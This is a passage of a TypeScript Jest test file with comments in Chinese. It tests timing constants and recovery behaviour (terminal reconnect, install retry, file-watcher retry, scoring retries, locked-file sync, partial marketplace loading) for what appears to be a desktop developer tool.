  test('TIME_L3_06: 进程关闭超时边界 -- 5s', async () => {
    expect(timeConstants.processStopTimeout).toBe(5000);

    const { createProcessStopper } = await import(
      '@/modules/terminal/process-stopper'
    );
    const stopper = createProcessStopper(5000);

    // Normal exit < 5s -> Stopping -> Stopped
    const normalResult = stopper.stop({ exitAfterMs: 3000 });
    expect(normalResult.finalState).toBe('Stopped');

    // Timeout >= 5s -> Stopping -> Disconnected
    const timeoutResult = stopper.stop({ exitAfterMs: 6000 });
    expect(timeoutResult.finalState).toBe('Disconnected');

    // Exactly 5s -> Disconnected
    const exactResult = stopper.stop({ exitAfterMs: 5000 });
    expect(exactResult.finalState).toBe('Disconnected');
  });

  // TIME_L3_07: 文件监听重试间隔 -- 3s x 最多 3 次
  test('TIME_L3_07: 文件监听重试间隔 -- 3s x 最多 3 次', async () => {
    expect(timeConstants.watchRetryInterval).toBe(3000);
    expect(timeConstants.watchRetryMax).toBe(3);

    const { createFileWatcherWithRetry } = await import(
      '@/modules/data/file-watcher'
    );
    const watcher = createFileWatcherWithRetry({
      retryIntervalMs: 3000,
      maxRetries: 3,
    });

    // First failure -> retry at 3s
    watcher.simulateFailure();
    expect(watcher.retryCount).toBe(1);
    expect(watcher.state).toBe('Retrying');

    // 3 consecutive failures -> stop retrying
    watcher.simulateFailure();
    watcher.simulateFailure();
    expect(watcher.retryCount).toBe(3);
    expect(watcher.state).toBe('WatchError');

    // 2nd retry succeeds -> resume watching
    const watcher2 = createFileWatcherWithRetry({
      retryIntervalMs: 3000,
      maxRetries: 3,
    });
    watcher2.simulateFailure();
    watcher2.simulateSuccess();
    expect(watcher2.state).toBe('Watching');
  });

  // TIME_L3_08: 临时文件清理时间 -- 终端关闭 / 24h
  test('TIME_L3_08: 临时文件清理时间 -- 终端关闭 / 24h', async () => {
    expect(timeConstants.tempFileCleanup).toBe(24 * 60 * 60 * 1000);

    const { createTempFileCleaner } = await import(
      '@/modules/editor/temp-cleanup'
    );
    const cleaner = createTempFileCleaner();

    // Terminal close -> temp files cleaned
    const closeResult = await cleaner.cleanOnTerminalClose('terminal-1');
    expect(closeResult.cleaned).toBe(true);

    // File > 24h -> auto cleaned
    const oldFile = cleaner.checkAge({
      createdAtMs: Date.now() - 25 * 60 * 60 * 1000,
    });
    expect(oldFile.shouldClean).toBe(true);

    // File < 24h -> preserved
    const newFile = cleaner.checkAge({
      createdAtMs: Date.now() - 12 * 60 * 60 * 1000,
    });
    expect(newFile.shouldClean).toBe(false);
  });
});

// ============================================================
// 六、异常恢复（6 cases）
// ============================================================
describe('L3 -- 异常恢复', () => {
  beforeEach(() => {
    resetIpcMocks();
  });

  // RECOVER_L3_01: 终端异常断开后重连
  test('RECOVER_L3_01: 终端异常断开后重连', async () => {
    const { createTerminalMachine } = await import(
      '@/modules/terminal/terminal-machine'
    );
    const machine = createTerminalMachine();

    // Running -> abnormal exit -> Disconnected
    machine.send('START');
    machine.send('PROCESS_READY');
    expect(machine.state).toBe('Running');

    machine.send('PROCESS_ABNORMAL_EXIT', { exitCode: 1 });
    expect(machine.state).toBe('Disconnected');
    expect(machine.context.inputDisabled).toBe(true);

    // Reconnect -> new process
    machine.send('RECONNECT');
    expect(machine.state).toBe('Starting');
    machine.send('PROCESS_READY');
    expect(machine.state).toBe('Running');
    expect(machine.context.isNewProcess).toBe(true);
  });

  // RECOVER_L3_02: 安装失败后重试
  test('RECOVER_L3_02: 安装失败后重试', async () => {
    const { createInstallMachine } = await import(
      '@/modules/marketplace/install-machine'
    );
    const machine = createInstallMachine({ packageType: 'skill' });

    // Download -> network interrupt -> InstallFailed
    machine.send('START_INSTALL');
    machine.send('DOWNLOAD_FAILED', { error: 'Network interrupted' });
    expect(machine.state).toBe('InstallFailed');

    // Retry after network recovery
    machine.send('RETRY');
    expect(machine.state).toBe('Downloading');

    machine.send('DOWNLOAD_COMPLETE');
    machine.send('INSTALL_COMPLETE');
    expect(machine.state).toBe('Installed');
  });

  // RECOVER_L3_03: 文件监听错误恢复
  test('RECOVER_L3_03: 文件监听错误恢复', async () => {
    const { createFileWatcherWithRetry } = await import(
      '@/modules/data/file-watcher'
    );
    const watcher = createFileWatcherWithRetry({
      retryIntervalMs: timeConstants.watchRetryInterval,
      maxRetries: timeConstants.watchRetryMax,
    });

    // Start watching
    watcher.start();
    expect(watcher.state).toBe('Watching');

    // Directory deleted -> WatchError
    watcher.simulateFailure();
    expect(watcher.state).toBe('Retrying');

    // Directory restored -> back to Watching
    watcher.simulateSuccess();
    expect(watcher.state).toBe('Watching');
  });

  // RECOVER_L3_04: 评分失败后重试
  test('RECOVER_L3_04: 评分失败后重试', async () => {
    const { createScoreMachine } = await import('@/modules/score/score-machine');
    const machine = createScoreMachine();

    machine.send('START_SCORING');

    // 3 consecutive failures
    for (let i = 0; i < 3; i++) {
      machine.send('SCORE_FAILED');
      if (i < 2) {
        machine.send('AUTO_RETRY');
      }
    }

    // After 3 failures -> final error, manual retry only
    expect(machine.state).toBe('ScoreFailed');
    expect(machine.context.retryCount).toBe(3);
    expect(machine.context.canAutoRetry).toBe(false);
    expect(machine.context.showManualRetryButton).toBe(true);
  });

  // RECOVER_L3_05: 同步中断恢复
  test('RECOVER_L3_05: 同步中断恢复', async () => {
    const { createSyncEngine } = await import('@/modules/data/sync-engine');
    const engine = createSyncEngine();

    // Sync with one file locked
    const result = await engine.syncBatch([
      { path: 'file1.jsonl', locked: false },
      { path: 'file2.jsonl', locked: true },
      { path: 'file3.jsonl', locked: false },
    ]);

    expect(result.synced).toHaveLength(2);
    expect(result.skipped).toHaveLength(1);
    expect(result.skipped[0].path).toBe('file2.jsonl');
    expect(result.skipped[0].reason).toContain('locked');

    // Next sync cycle -> locked file now unlocked
    const retryResult = await engine.syncBatch([
      { path: 'file2.jsonl', locked: false },
    ]);
    expect(retryResult.synced).toHaveLength(1);
  });

  // RECOVER_L3_06: 部分源加载失败降级
  test('RECOVER_L3_06: 部分源加载失败降级', async () => {
    const { createBrowserMachine } = await import(
      '@/modules/marketplace/browser-machine'
    );
    const machine = createBrowserMachine();

    machine.send('OPEN');
    expect(machine.state).toBe('Loading');

    // 4 sources succeed, 2 timeout
    for (let i = 0; i < 4; i++) {
      machine.send('SOURCE_LOADED', { source: `s${i}`, packages: [{ id: `pkg-${i}` }] });
    }
    machine.send('SOURCE_FAILED', { source: 's4', error: 'timeout' });
    machine.send('SOURCE_FAILED', { source: 's5', error: 'timeout' });

    expect(machine.state).toBe('PartialReady');
    expect(machine.context.loadedSources).toHaveLength(4);
    expect(machine.context.failedSources).toHaveLength(2);

    // User can browse loaded data
    expect(machine.context.displayedPackages.length).toBeGreaterThan(0);

    // Failed sources auto-retry success -> Ready
    machine.send('SOURCE_LOADED', { source: 's4', packages: [{ id: 'pkg-4' }] });
    machine.send('SOURCE_LOADED', { source: 's5', packages: [{ id: 'pkg-5' }] });
    expect(machine.state).toBe('Ready');
    expect(machine.context.loadedSources).toHaveLength(6);
  });
});
